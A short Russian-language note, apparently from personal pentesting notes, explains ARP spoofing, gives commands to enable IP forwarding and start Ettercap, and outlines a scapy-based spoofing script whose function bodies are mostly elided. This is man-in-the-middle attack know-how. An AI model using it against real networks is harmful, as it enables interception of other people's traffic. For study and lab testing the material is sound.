...
**ARP-spoofing** (или **ARP-poisoning**) — сетевая атака, которая основана на недостатках протокола ARP. Данный протокол не проверяет подлинность ARP-запросов и ARP-ответов, что позволяет «встать посередине» в атакуемой сети.
...
# Проведение атаки при помощи [[Ettercap]]
...
> Обязательный флаг для MITM!
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Запуск инструмента в GUI
```bash
sudo ettercap -G
```


# Скрипт для проведения атаки ARP-spoofing
...
def _enable_linux_iproute(): # включение IP-routing на linux
...
def _enable_windows_iproute(): # включение IP-routing на windows
...
def enable_ip_route(verbose=True): # включение IP-routing на всех платформах
...
def get_mac(ip): # Получение мака любого устройства в сети
    
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True): # Основная функция подмены
...
def restore(target_ip, host_ip, verbose=True): # Функция для завершения атаки
